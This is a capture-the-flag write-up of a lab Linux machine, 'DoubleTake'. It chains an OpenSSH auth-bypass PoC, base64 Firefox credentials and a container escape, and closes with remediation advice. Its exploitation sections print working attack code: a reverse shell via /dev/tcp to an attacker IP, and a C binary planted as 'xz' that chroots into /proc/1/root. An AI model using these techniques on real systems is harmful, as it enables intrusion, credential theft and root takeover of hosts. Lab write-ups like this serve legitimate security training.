
| Property         | Value                                                                                                                                                                                                                |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                                                                                                                                                |
| **Difficulty**   | Easy                                                                                                                                                                                                                 |
| **Release Date** | 12th November, 2026                                                                                                                                                                                                  |
| **State**        | Retired                                                                                                                                                                                                              |
| **IP**           | 10.129.248.123                                                                                                                                                                                                       |
| **Techniques**   | OpenSSH musl-libc auth bypass (CVE-2026-123158), credential disclosure via Firefox profile, Docker CVE-2026-41567, PATH hijack of `xz` in server-side archive extraction, container escape via `/proc/1/root` chroot |
| **Tags**         | #web #privesc #linux #docker                                                                                                                                                                                         |

> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.248.123`, `10.129.210.118`).

---

## Summary

DoubleTake is a Linux (Alpine-based) machine hosting a web app called **Zentara** on port 80, with SSH open on port 22. OpenSSH prior to 10.6p2 on musl libc without PAM is vulnerable to CVE-2026-123158, a password-authentication bypass that grants a shell as the `alpine` user. A saved Firefox login found in `alpine`'s home directory discloses base64-encoded, credentials for the user `bob`, which work over SSH and grant the user flag. Zentara exposes a "Deploy to Workspace" feature that extracts uploaded `.tar`/`.tar.gz`/`.tar.xz` archives server-side via the Docker-backed workspace container (Docker 29.5.0). By first planting a malicious `xz` binary inside the workspace's `usr/bin/` path and then triggering a second `.tar.xz` deployment, the service's own extraction routine invokes the planted `xz` instead of the real one. That binary mounts `/proc`, chroots into `/proc/1/root` to pivot onto the host filesystem, and spawns a reverse root shell.

---

## Attack summary

|**Step**|**Vector**|**Outcome**|
|---|---|---|
|Foothold|CVE-2026-123158 — OpenSSH musl-libc password auth bypass|Shell as `alpine`|
|Lateral Movement|Firefox `logins.json` in `alpine`'s profile (base64, not encrypted)|Credentials for `bob`; SSH as `bob` (user flag)|
|Privilege Escalation|CVE-2026-41567 (Docker) — PATH hijack of `xz` during server-side `.tar.xz` extraction → `/proc/1/root` chroot|Reverse shell as `root` (root flag)|

---

## Enumeration

### Nmap Scan

```
nmap -sV -sC 10.129.248.123
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-13 10:00 EST
Nmap scan report for 10.129.248.123
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

### Web Enumeration

Port 80 fronts a **Zentara** instance behind HTTP Basic Auth (`realm=Zentara`). No other vhosts were found, the login does not accept weak/default credentials, and it resists brute-forcing.

### SSH Enumeration

The banner (`OpenSSH 10.6`) is the lead that pointed at the vulnerability below.

---

### CVE-2026-123158 — OpenSSH Authentication Bypass

Reference: [previdian.com/CVE-2026-123158](https://previdian.com/CVE-2026-123158#evidence)

`sshd` in OpenSSH before 10.6p2, on Linux, when musl libc is used without PAM, lacks a workaround for a password-authentication bypass related to misinterpreting whether a string is intended to be a password hash. For some account configurations, **any password between 256 and 1024 characters succeeds**. Alpine Linux is a representative affected platform (musl libc, no PAM).

**Affected:** OpenBSD OpenSSH < 10.6p2; Alpine Linux shipping OpenSSH < 10.6p2.

---

## Foothold

### Vulnerability

The target runs Alpine Linux with OpenSSH < 10.6p2, matching the musl/no-PAM conditions for CVE-2026-123158. Supplying an oversized password (256–1024 characters) to the `alpine` account bypasses password authentication entirely.

### Exploitation

PoC: [github.com/zanarelkov/CVE-2026-123158_SSHole_PoC](https://github.com/zanarelkov/CVE-2026-123158_SSHole_PoC)

```shell
python3 CVE-2026-123158.py --lhost 10.10.15.89 --lport 3333 --target 10.129.248.123
LHOST  : 10.10.15.89
LPORT  : 3333
TARGET : 10.129.248.123
PORT   : 22
USER   : alpine
Denied
Authenticated
```

Shell caught as `alpine`:

```shell
nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.15.89] from (UNKNOWN) [10.129.248.123] 34525
sh: can't access tty; job control turned off
~ $ id
uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
~ $
```

---

## User Flag

### Lateral Movement from `alpine` to `bob`

`alpine`'s home directory contains a Firefox profile:

```shell
~ $ ls -la
total 16
drwxr-sr-x    1 alpine   alpine        4096 Nov 10 20:15 .
drwxr-xr-x    1 root     root          4096 Nov 10 20:15 ..
drwxr-sr-x    3 alpine   alpine        4096 Nov 10 20:15 .mozilla
```

```bash
~/.mozilla/firefox/zentara.default $ ls -la
total 88
-rw-------    1 alpine   alpine       28672 Nov 10 20:15 cert9.db
-rw-------    1 alpine   alpine       36864 Nov 10 20:15 key4.db
-rw-r--r--    1 alpine   alpine         487 Nov 10 20:15 logins.json
-rw-------    1 alpine   alpine         456 Nov 10 20:15 pkcs11.txt
-rw-r--r--    1 alpine   alpine         182 Nov 10 20:15 prefs.js
-rw-r--r--    1 alpine   alpine           2 Nov 10 20:15 signedInUser.json
```

```bash
~/.mozilla/firefox/zentara.default $ cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara","formActionOrigin":null,"usernameField":"","passwordField":"","encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==","guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}","encType":0,"timeCreated":1730000000000,"timeLastUsed":1730900000000,"timePasswordChanged":1730000000000,"timesUsed":14}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

Despite the field names, `encType":0` means the values are **not actually encrypted**, they are plain base64:

```bash
echo Ym9i | base64 -d
bob
echo "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==" | base64 -d
CorrectHorseBatteryStaple
```

Credentials recovered: `bob:CorrectHorseBatteryStaple`

SSH access as `bob`:

```bash
ssh bob@doubletake.htb
bob@doubletake.htb's password:
Welcome to Alpine!

7f906e0ee8ec:~$ whoami
bob
7f906e0ee8ec:~$ ls
user.txt
7f906e0ee8ec:~$ cat user.txt
cd16204f6f6004958f99dea6bb8518ca
```

The same credentials also work on the Zentara web app behind the Basic Auth login form found during enumeration:

![](DoubleTake/screens/1.png)

---

## Privilege Escalation

### Enumeration

The Zentara platform's **Status** page discloses the backing container engine:

![](DoubleTake/screens/2.png)

- Docker Engine **29.5.0**, API version 1.54, OS/Arch `linux/amd64`
- A workspace container, `zentara-alpine`, running from image `zentara-alpine:latest`

Docker Engine 29.5.0 is vulnerable to **CVE-2026-41567**.

The platform's **API Docs** describe `POST /v1/files`, used to upload files for `assistants`, `fine-tune`, or `deploy` purposes:

![](DoubleTake/screens/3.png)

A separate **Deploy to Workspace** page accepts `.tar`, `.tar.gz`, or `.tar.xz` archives and states they are "decompressed and extracted server-side by the container engine", meaning an `.tar.xz` upload causes the backend to invoke a local `xz` binary to decompress it before extraction.

### Vulnerability

#### CVE-2026-41567

Docker Engine 29.5.0 is affected by CVE-2026-41567. Combined with the deploy service's behavior, this allows a workspace container to be escaped: extraction shells out to whatever `xz` binary resolves on the workspace's `PATH`, so planting a malicious `xz` inside the workspace (e.g. at `usr/bin/xz`) and then triggering a second `.tar.xz` deployment causes the server to execute the planted binary instead of the genuine `xz`. A binary that mounts `/proc` and chroots into `/proc/1/root` escapes the workspace container by pivoting onto the host's filesystem (PID 1's root is the host), since the deploy process's own root is backed by the container runtime.

### Exploitation

A malicious `xz` replacement is written that mounts `/proc`, chroots to the host root via PID 1, and spawns a reverse shell:

```c
cat xz.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
    "bash -i >& /dev/tcp/10.10.15.89/4444 0>&1", NULL);
    return 1;
}
```

Compiled statically so it has no dependency on the target's shared libraries:

```shell
gcc -static -o xz xz.c
```

The compiled binary is placed at `usr/bin/xz` inside a `pkg/` staging tree and packed into a plain tar (no compression, so it doesn't itself need `xz` to unpack):

```shell
cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz
cd ..
```

The plant is deployed to the workspace root via the `/deploy` endpoint, overwriting the real `xz` on the workspace's `PATH`:

```shell
curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@plant.tar' \
  -F 'workspace=/' \
  http://10.129.210.118/deploy
{"deployment":{"created_at":1794911014,"filename":"plant.tar","id":"dep-95e3f9","size":768000,"status":"success","workspace":"/"},"status":"success"}
```

A second archive is built, this time genuinely `.xz`-compressed with the real local `xz`, to act as the trigger that forces the backend to invoke (the now-poisoned) `xz` during extraction:

```shell
echo x > t && tar cf - t | xz > trigger.tar.xz
```

This trigger archive is uploaded through the **Deploy to Workspace** UI:

![](DoubleTake/screens/4.png)

Catching a shell as root:

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.89] from (UNKNOWN) [10.129.210.118] 37568
bash: cannot set terminal process group (1369): Inappropriate ioctl for device
bash: no job control in this shell
root@doubletake:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```
root@doubletake:/# cat /root/root.txt
cat /root/root.txt
1a93ee92076c96c8e5fc266b7b1acd84
```

---

## Remediation

- **CVE-2026-123158:** Upgrade OpenSSH to 10.6p2 or later on any musl-libc host running without PAM (e.g. Alpine Linux). Do not rely on default `sshd` password-auth behavior without verifying the patched workaround is present.
- **CVE-2026-41567 (Docker):** Upgrade Docker Engine past 29.5.0 to a patched release.
- **Base64 browser-stored credentials:** Firefox's `logins.json` entries with `encType: 0` are not encrypted, only base64-encoded. Never leave a logged-in browser profile with saved credentials on a shared or multi-user host; use a master password / OS keyring-backed encryption, and rotate any credential found this way.
- **Server-side archive extraction trusting `PATH`:** A deploy/extraction service that shells out to an external decompressor (`xz`, `gzip`, `tar`, etc.) must invoke it by an absolute, non-writable path, never by relying on an attacker-influenced `PATH` or a writable workspace directory that precedes trusted directories in that `PATH`.
- **Container escape via `/proc/1/root`:** The extraction process should run in a properly isolated container/namespace without the capabilities (`CAP_SYS_ADMIN`) needed to mount filesystems or without visibility into the host's `/proc/1/root`. Run deploy/extraction workers as a restricted, unprivileged user inside a hardened container, and deny `mount()`/`chroot()` syscalls via seccomp.

---

## References

- [CVE-2026-123158 writeup](https://previdian.com/CVE-2026-123158#evidence)
- [CVE-2026-123158_SSHole_PoC](https://github.com/zanarelkov/CVE-2026-123158_SSHole_PoC)
- [CVE-2026-41567 — NVD](https://nvd.nist.gov/vuln/detail/cve-2026-41567)